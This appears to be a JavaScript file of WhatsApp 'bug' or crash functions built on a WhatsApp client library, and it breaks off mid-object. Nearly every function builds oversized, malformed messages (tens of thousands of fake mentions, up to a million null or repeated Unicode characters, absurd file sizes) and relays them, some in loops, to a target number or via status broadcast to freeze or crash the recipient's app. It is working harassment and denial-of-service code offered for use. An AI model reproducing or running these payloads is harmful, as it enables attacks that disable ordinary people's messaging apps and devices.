async function HardInvis(sock, targetJid) {
  const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

  try {
    const audioMessage = {
      url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
      mimetype: "audio/mpeg",
      fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
      fileLength: 99999999999999,
      seconds: 99999999999999,
      ptt: true,
      mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
      fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
      directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc",
      mediaKeyTimestamp: 99999999999999,
      contextInfo: {
        mentionedJid: [
          "@s.whatsapp.net",
          ...Array.from({ length: 1900 }, () =>
            `1${Math.floor(Math.random() * 90000000)}@s.whatsapp.net`
          ),
        ],
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: "120363375427625764@newsletter",
          serverMessageId: 1,
          newsletterName: "Ambatukam x Proto",
        },
      },
      waveform:
        "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg==",
    };

    const videoMessage = {
      url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
      mimetype: "video/mp4",
      fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
      fileLength: 289511,
      seconds: 15,
      mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
      caption: "ោ៝".repeat(4000),
      height: 640,
      width: 640,
      fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
      directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc",
      mediaKeyTimestamp: 1743848703,
      contextInfo: {
        isSampled: true,
        mentionedJid: [
          "13135550002@s.whatsapp.net",
          ...Array.from({ length: 1900 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
          ),
        ],
      },
      forwardedNewsletterMessageInfo: {
        newsletterJid: "120363321780343299@newsletter",
        serverMessageId: 1,
        newsletterName: "⏤͟͟͞͞𝑰𝒕𝒔𝑴𝒆 𝐾𝑖𝑝𝑜𝑝",
      },
      streamingSidecar:
        "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
      thumbnailDirectPath:
        "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc",
      thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
      thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
      annotations: [
        {
          embeddedContent: { audioMessage },
          embeddedAction: true,
        },
      ],
    };

    for (let i = 0; i < 1500; i++) {
      const msg = generateWAMessageFromContent(
        targetJid,
        { viewOnceMessage: { message: { videoMessage } } },
        {}
      );

      await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [targetJid],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: targetJid }, content: undefined }],
              },
            ],
          },
        ],
      });

      await sock.relayMessage(
        targetJid,
        {
          groupStatusMentionMessage: {
            message: { protocolMessage: { key: msg.key, type: 25 } },
          },
        },
        {
          additionalNodes: [
            {
              tag: "meta",
              attrs: { is_status_mention: "true" },
              content: undefined,
            },
          ],
        }
      );

      if (i < 99) {
        await sleep(5000);
      }
    }
  } catch (err) {}
}

async function MewVtxpayment(sock, targetJid) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                extendedTextMessage: {
                    text: '.',
                    contextInfo: {
                        stanzaId: targetJid,
                        participant: targetJid,
                        quotedMessage: {
                            conversation: "؂ن؃؄ٽ؂ن؃؄ٽ" + " ꦾ".repeat(100)
                        },
                        disappearingMode: {
                            initiator: "CHANGED_IN_CHAT",
                            trigger: 'CHAT_SETTING'
                        }
                    },
                    inviteLinkGroupTypeV2: "DEFAULT"
                },
                contextInfo: {
                    mentionedJid: Array.from({
                        length: 1999
                    }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                    isSampled: true,
                    remoteJid: "status@broadcast",
                    forwardingScore: 9741,
                    isForwarded: true
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(targetJid, generateMessage, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [targetJid],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{
                    tag: "to",
                    attrs: {
                        jid: targetJid
                    },
                    content: undefined
                }]
            }]
        }]
    });
}

async function VzxtusHardTime(sock, targetJid) {
  let CursorAPI = JSON.stringify({
    status: true,
    criador: "🩸",
    resultado: {
      type: "md",
      ws: {
        _events: { "CB:ib,,dirty": ["Array"] },
        _eventsCount: 8000000,
        _maxListeners: 1,
        url: "wss://web.whatsapp.com/ws/chat",
        config: {
          version: ["@latest"],
          browser: ["Array"],
          waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
          sockCectTimeoutMs: 20000,
          keepAliveIntervalMs: 30000,
          logger: {},
          printQRInTerminal: false,
          emitOwnEvents: true,
          defaultQueryTimeoutMs: 60000,
          customUploadHosts: [],
          retryRequestDelayMs: 250,
          maxMsgRetryCount: 5,
          fireInitQueries: true,
          auth: { Object: "authData" },
          markOnlineOnsockCect: true,
          syncFullHistory: true,
          linkPreviewImageThumbnailWidth: 192,
          transactionOpts: { Object: "transactionOptsData" },
          generateHighQualityLinkPreview: true,
          options: {},
          appStateMacVerification: { Object: "appStateMacData" },
          mobile: true
        }
      }
    }
  });

  const mentionedList = [
    "696969696969@s.whatsapp.net",
    ...Array.from({ length: 35000 }, () =>
      `92${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    )
  ];

  let cards = [];

  for (let i = 0; i < 1000; i++) {
    cards.push({
      header: {
        title: "ꦾ".repeat(5000),
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/jpeg",
          fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
          fileLength: 107374182.4,
          height: 999,
          width: 999,
          mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
          fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
          directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1749172037",
          jpegThumbnail: "PhynxAgency",
          scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
          scanLengths: [8596, 155493]
        },
        hasMediaAttachment: true
      },
      body: {
        text: "ꦾ".repeat(60000)
      },
      footer: {
        text: "ꦾ".repeat(60000)
      },
      nativeFlowMessage: {
        messageParamsJson: "{".repeat(10000),
        buttons: [
          {
            name: "single_select",
            buttonParamsJson: CursorAPI
          },
          {
            name: "single_select",
            buttonParamsJson: JSON.stringify({
              status: true,
              criador: "🩸",
              resultado: "{".repeat(10000)
            })
          },
          {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
              display_text: "⎋ xɴxx.ᴄᴏᴍ -‣",
              url: `https://xxx.app/${"ꦾ".repeat(99999)}`,
              merchant_url: `https://xxx.app/${"ꦾ".repeat(99999)}`
            })
          },
          {
            name: "review_and_pay",
            buttonParamsJson: CursorAPI
          },
          {
            name: "galaxy_message",
            buttonParamsJson: CursorAPI
          },
          {
            name: "call_permission_request",
            buttonParamsJson: CursorAPI
          },
          {
            name: "call_permission_request",
            buttonParamsJson: JSON.stringify({
              status: true,
              criador: "🩸",
              resultado: "{".repeat(10000)
            })
          },
          {
            name: "cta_call",
            buttonParamsJson: JSON.stringify({
              status: "0"
            })
          }
        ]
      }
    });
  }

  const msg = await generateWAMessageFromContent(targetJid, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16)
            })
          },
        interactiveMessage: {
          body: {
            text: ''
          },
          footer: {
            text: ''
          },
          carouselMessage: {
            cards: []
          },
          contextInfo: {
            participant: targetJid,
            stanzaId: "PnX" + "-Id" + Math.floor(Math.random() * 99999),
            mentionedJid: mentionedList,
            conversionSource: "facebook_ads",
            conversionData: "{\"fb_campaign_id\":\"9999\",\"fb_ad_id\":\"9999\"}",
            conversionDelayMs: "9999",
            groupInviteMessage: {
              inviteCode: "Xx".repeat(10000),
              groupJid: "1@g.us",
              groupName: "\u0000".repeat(10000),
              inviteExpiration: 99999999999,
              caption: ""
            },
            externalAdReply: {
              title: "\u0000".repeat(15000),
              body: " who i am ~ @raldzzxyz_ ",
              thumbnailUrl: "about:blank",
              mediaType: 1,
              sourceUrl: `https://xnxx.com/${"ꦾ".repeat(99999)}`,
              showAdAttribution: false
            },
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "call_permission_request",
                      paramsJson: "\u0000".repeat(999999),
                      version: 3
                    }
                  }
                }
              }
            },
            remoteJid: targetJid
          }
        }
      }
    }
  }, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [targetJid],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: targetJid },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
}

async function bulldozer1GB(sock, targetJid) {
  let parse = true;
  let SID = "5e03e0&mms3";
  let key = "10000000_2012297619515179_5714769099548640934_n.enc";
  let type = `image/webp`;
  if (11 > 9) {
    parse = parse ? false : true;
  }

  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=${SID}=true`,
          fileSha256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",
          fileEncSha256: "zUvWOK813xM/88E1fIvQjmSlMobiPfZQawtA9jg9r/o=",
          mediaKey: "ymysFCXHf94D5BBUiXdPZn8pepVf37zAb7rzqGzyzPg=",
          mimetype: type,
          directPath: `/v/t62.43144-24/${key}?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=5e03e0`,
          fileLength: {
            low: Math.floor(Math.random() * 1000),
            high: 0,
            unsigned: true,
          },
          mediaKeyTimestamp: {
            low: Math.floor(Math.random() * 1700000000),
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            participant: targetJid,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1000 * 40 },
                () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: Math.floor(Math.random() * -20000000),
            high: 1000,
            unsigned: parse,
          },
          isAvatar: parse,
          isAiSticker: parse,
          isLottie: parse,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(targetJid, message, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [targetJid],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: targetJid },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

async function AmeliaBeta(sock, targetJid) {
  try {
    const mentionedList = [
      "13135550002@s.whatsapp.net",
      ...Array.from({ length: 2000 }, () =>
        `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
      )
    ];

    const embeddedMusic = {
      musicContentMediaId: "589608164114571",
      songId: "870166291800508",
      author: "Amelia Send Bug" + "ោ៝".repeat(10000),
      title: "Amelia Modders",
      artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
      artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
      artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
      artistAttribution: "https://www.instagram.com/_u/J.oxyy",
      countryBlocklist: true,
      isExplicit: true,
      artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMsg = {
      videoMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/545780153_1768068347247055_8008910110610321588_n.enc?ccb=11-4&oh=01_Q5Aa2gF45pi45HoFCrDj40WuGbf2qvyU6K3wubsygX5Y_AnGmw&oe=68E66184&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "EY0PNB4nOae0b9/f+tNPB99rJSmJZ/Ns2SEfu7Jc8wI=",
        fileLength: "2534607",
        seconds: 8,
        mediaKey: "YDQMBzXkapRZjXrPVAr2CwEPIBnv6aDHHQLaEYLOPyE=",
        height: 1280,
        width: 720,
        fileEncSha256: "XcTQbrJvO9ICWDBnW8710Ow4QLbygfTUYzP3l0rg0no=",
        directPath: "/v/t62.7161-24/545780153_1768068347247055_8008910110610321588_n.enc?ccb=11-4&oh=01_Q5Aa2gF45pi45HoFCrDj40WuGbf2qvyU6K3wubsygX5Y_AnGmw&oe=68E66184&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1757337021",
        jpegThumbnail: Buffer.from("...base64thumb...", "base64"),
        contextInfo: {
          isSampled: true,
          mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
          newsletterJid: "120363321780343299@newsletter",
          serverMessageId: 1,
          newsletterName: "Amelia Send Bug"
        },
        annotations: [
          {
            embeddedContent: { embeddedMusic },
            embeddedAction: true
          }
        ]
      }
    };

    const stickerMsg = {
      viewOnceMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
            mimetype: "image/webp",
            directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
            fileLength: { low: 1, high: 0, unsigned: true },
            mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
            firstFrameLength: 19904,
            firstFrameSidecar: "KN4kQ5pyABRAgA==",
            isAnimated: true,
            contextInfo: {
              mentionedJid: ["13135550002@s.whatsapp.net"],
              groupMentions: [],
              entryPointConversionSource: "non_contact",
              entryPointConversionApp: "whatsapp",
              entryPointConversionDelaySeconds: 467593
            },
            stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
            isAvatar: true,
            isAiSticker: true,
            isLottie: true
          }
        }
      }
    };

    const biji = await generateWAMessageFromContent(
      targetJid,
      {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: {
                text: "Amelia Send Delay",
                format: "DEFAULT"
              },
              nativeFlowResponseMessage: {
                name: "call_permission_request",
                paramsJson: "\x10".repeat(1045000),
                version: 3
              },
              entryPointConversionSource: "galaxy_message"
            }
          }
        }
      },
      {
        ephemeralExpiration: 0,
        forwardingScore: 9741,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "999999")
      }
    );

    await sock.relayMessage("status@broadcast", biji.message, {
      messageId: biji.key.id,
      statusJidList: [targetJid],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: targetJid }, content: undefined }]
            }
          ]
        }
      ]
    });
    await sleep(1000); // sᴇᴛᴛɪɴɢ ᴀᴊᴀ 

    await sock.relayMessage("status@broadcast", videoMsg, {
      messageId: "AmeliaBeta-" + Date.now(),
      statusJidList: [targetJid],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: targetJid }, content: undefined }]
            }
          ]
        }
      ]
    });
    await sleep(1000); // sᴇᴛᴛɪɴɢ ᴀᴊᴀ 

    await sock.relayMessage("status@broadcast", stickerMsg, {
      messageId: "Sticker-" + Date.now(),
      statusJidList: [targetJid]
    });
    await sleep(1000); // sᴇᴛᴛɪɴɢ ᴀᴊᴀ 

    console.log(chalk.red(`Send Bug AmeliaBeta : ${targetJid}`));
  } catch (err) {
    console.error("AmeliaBeta Error:", err);
  }
}

async function delaytod(sock, targetJid) {
  const mentioned = Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 9999999) + "@s.whatsapp.net");

  const documentMsg = {
    documentMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7119-24/13158749_1750335815519895_6021414070433962213_n.enc?ccb=11-4&oh=01_Q5Aa1gE7ilsZ_FF3bjRSDrCYZWbHSHDUUnqhdPHONunoKyqDNQ&oe=685E3E69&_nc_sid=5e03e0",
      mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
      fileName: "⛧ kendekpacarmiche ⛧",
      fileLength: "99999999999",
      pageCount: 999,
      mediaKey: Buffer.from("4b2d315efbdfea6d69ffdd6ce80ae57fa90ddcd8935b897d85ba29ef15674371", "hex"),
      fileSha256: Buffer.from("4c69bbca7b6396dd6766327cc0b13fc64b97c581442eea626c3919643f3793c4", "hex"),
      fileEncSha256: Buffer.from("414942a0d3204ae71b4585ae1dedafcc8ad2a14687fa9cbbcde3efb5a4ac86a9", "hex"),
      mediaKeyTimestamp: 1748420423,
      directPath: "/v/t62.7119-24/13158749_1750335815519895_6021414070433962213_n.enc",
      contextInfo: {
        mentionedJid: mentioned,
        forwardingScore: 999,
        isForwarded: true
      }
    }
  };

  const stickerMsg = {
    stickerMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
      mimetype: "image/webp",
      fileSha256: Buffer.from("xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=", "base64"),
      fileEncSha256: Buffer.from("zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=", "base64"),
      mediaKey: Buffer.from("nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=", "base64"),
      mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
      isAnimated: true,
      contextInfo: { mentionedJid: mentioned }
    }
  };

  const audioMsg = {
    audioMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7114-24/30579250_1011830034456290_180179893932468870_n.enc?ccb=11-4&oh=01_Q5Aa1gHANB--B8ZZfjRHjSNbgvr6s4scLwYlWn0pJ7sqko94gg&oe=685888BC&_nc_sid=5e03e0&mms3=true",
      mimetype: "audio/mpeg",
      fileSha256: Buffer.from("pqVrI58Ub2/xft1GGVZdexY/nHxu/XpfctwHTyIHezU=", "base64"),
      fileLength: "389948",
      seconds: 24,
      ptt: false,
      mediaKey: Buffer.from("v6lUyojrV/AQxXQ0HkIIDeM7cy5IqDEZ52MDswXBXKY=", "base64"),
      fileEncSha256: Buffer.from("fYH+mph91c+E21mGe+iZ9/l6UnNGzlaZLnKX1dCYZS4=", "base64"),
      caption: "Micelv4 Audio Combo",
      contextInfo: { mentionedJid: mentioned }
    }
  };

  const videoMsg = {
    videoMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc?ccb=11-4&oh=01_Q5Aa1gHRy3d90Oldva3YRSUpdfcQsWd1mVWpuCXq4zV-3l2n1A&oe=685BEDA9&_nc_sid=5e03e0",
      mimetype: "video/mp4",
      fileSha256: Buffer.from("TTJaZa6KqfhanLS4/xvbxkKX/H7Mw0eQs8wxlz7pnQw=", "base64"),
      fileEncSha256: Buffer.from("o73T8DrU9ajQOxrDoGGASGqrm63x0HdZ/OKTeqU4G7U=", "base64"),
      mediaKey: Buffer.from("4CpYvd8NsPYx+kypzAXzqdavRMAAL9oNYJOHwVwZK6Y=", "base64"),
      height: 1280,
      width: 720,
      seconds: 14,
      mediaKeyTimestamp: "1748276788",
      contextInfo: { mentionedJid: mentioned }
    }
  };

  const albumMsg = {
    albumMessage: {
      expectedImageCount: 50,
      expectedVideoCount: 0
    }
  };

  const viewOnceMsg = {
    viewOnceMessage: { message: documentMsg }
  };

  const all = [documentMsg, stickerMsg, audioMsg, videoMsg, albumMsg, viewOnceMsg];

  for (const data of all) {
    const msg = await generateWAMessageFromContent(targetJid, data, {});
    await sock.relayMessage(targetJid, msg.message, { messageId: msg.key.id });
  }

  console.log("✅ Bacot Hama", targetJid);
}

async function location(targetJid) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                liveLocationMessage: {
                    degreesLatitude: 'p',
                    degreesLongitude: 'p',
                    caption: "YUKINA KILL YOU",
                    sequenceNumber: '0',
                    jpegThumbnail: '',
                contextInfo: {
                    mentionedJid: Array.from({
                        length: 30000
                    }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                    isSampled: true,
                    participant: X,
                    remoteJid: "status@broadcast",
                    forwardingScore: 9741,
                    isForwarded: true
                }
            }
        }
    }
};

const msg = generateWAMessageFromContent(targetJid, generateMessage, {});

await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [targetJid],
    additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
            tag: "mentioned_users",
            attrs: {},
            content: [{
                tag: "to",
                attrs: {
                    jid: targetJid
                },
                content: undefined
            }]
        }]
    }]
});
}

async function CVisible(targetJid) {
  await sock.relayMessage(
    targetJid,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: " #amelia ",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(1000000),
              version: 3,
            },
          },
        },
      },
    },
    {
      participant: { jid: targetJid },
    }
  );
}

async function paymentDelay(sock, targetJid) {
  try {
    let payMessage = {
      interactiveMessage: {
        body: { text: "X" },
        nativeFlowMessage: {
          buttons: [
            {
              name: "payment_method",
              buttonParamsJson: JSON.stringify({
                reference_id: null,
                payment_method: "\u0010".repeat(0x2710),
                payment_timestamp: null,
                share_payment_status: true,
              }),
            },
          ],
          messageParamsJson: "{}",
        },
      },
    };

    const msgPay = generateWAMessageFromContent(targetJid, payMessage, {});
    await sock.relayMessage(targetJid, msgPay.message, {
      additionalNodes: [{ tag: "biz", attrs: { native_flow_name: "payment_method" } }],
      messageId: msgPay.key.id,
      participant: { jid: targetJid },
      userJid: targetJid,
    });

    const msgStory = await generateWAMessageFromContent(
      targetJid,
      {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              nativeFlowResponseMessage: {
                version: 3,
                name: "call_permission_request",
                paramsJson: "\u0000".repeat(1045000),
              },
              body: {
                text: "Amelia",
                format: "DEFAULT",
              },
            },
          },
        },
      },
      {
        isForwarded: false,
        ephemeralExpiration: 0,
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"),
        forwardingScore: 0,
        font: Math.floor(Math.random() * 9),
      }
    );

    await sock.relayMessage("status@broadcast", msgStory.message, {
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: targetJid }, content: undefined }],
            },
          ],
        },
      ],
      statusJidList: [targetJid],
      messageId: msgStory.key.id,
    });

  } catch (err) {}
}

async function SnitchDelayVolteX(sock, targetJid) {
try {
    let mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 1950 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];
    let embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: "𐍃𐌍𐌉𐌕𐌂𐌇 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂" + "ោ៝".repeat(10000),
        title: "𐍃𐌍𐌉𐌕𐌂𐌇 ",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/17606956_686071860479481_2023913755657097039_n.enc?ccb=11-4&oh=01_Q5Aa1QG9-CRTR3xBq-Vz4QoJnMZRKop5NHKdAB9xc-rN1ds8cg&oe=683FA8F9&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "Y7jQDWDPfQSIEJ34j3BFn6Ad4NLuBer0W3UTHwqvpc8=",
        fileLength: "5945180",
        seconds: 17,
        mediaKey: "4s+R9ADOCB3EUsrVDE6XbKWrUNv31GRuR/bo2z8U3DU=",
        height: 1280,
        width: 720,
        fileEncSha256: "hG/yZfURm4ryYYa0JUnHdNautOMsYGoFKDGd5/4OGLQ=",
        directPath: "/v/t62.7161-24/17606956_686071860479481_2023913755657097039_n.enc?ccb=11-4&oh=01_Q5Aa1QG9-CRTR3xBq-Vz4QoJnMZRKop5NHKdAB9xc-rN1ds8cg&oe=683FA8F9&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1746415507",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "✦"
        },
        annotations: [{
            embeddedContent: { embeddedMusic },
            embeddedAction: true
        }]
    };

    let stickerMessage = {
        stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
            mimetype: "image/webp",
            directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
            fileLength: { low: 1, high: 0, unsigned: true },
